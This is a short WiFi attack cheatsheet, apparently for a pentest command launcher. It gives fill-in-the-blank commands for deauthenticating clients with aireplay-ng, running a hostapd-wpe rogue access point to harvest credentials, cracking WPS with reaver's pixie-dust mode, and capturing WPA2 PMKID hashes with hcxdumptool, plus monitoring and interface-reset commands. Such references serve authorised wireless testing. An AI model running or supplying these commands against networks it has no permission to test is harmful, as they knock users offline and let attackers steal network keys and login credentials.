# wifi

#plateform/linux #target/remote #cat/RECON #cat/ATTACK



## NetworkManager - Restart NetworkManager
```
systemctl restart NetworkManager
```


## aireplay - deauth client
```
aireplay-ng --deauth <deauth_count> -c <client_mac_address> -a <mac_address> <wlanmon_interface>
```

## hostapd-wpe - launch fake AP
```
hostapd-wpe <hostapd_conf>
```

## kismet - monitor WiFi
```
kismet -c <wlan_interface>
```

## nmcli - set back WiFi interface to managed mode
```
nmcli device set <wlan_interface> managed true
```

## reaver - launch WPS pixiedust attack
```
reaver -i <wlanmon_interface> -b <mac_address> -c <channel> -Z
```

## hcxdumptool - WPA2-PSK PMKID Capture
```
hcxdumptool -i <wlanmon_interface> -o capture.pcapng --enable_status=1 -c <channel>
```

## hcxdumptool - 
```
hcxpcaptool -z test.16800 test.pcapng
```

= wlan_interface: wlan0
= wlanmon_interface: wlan0mon
= deauth_count: 5
= hostapd_conf: /etc/hostapd-wpe/hostapd-wpe.conf
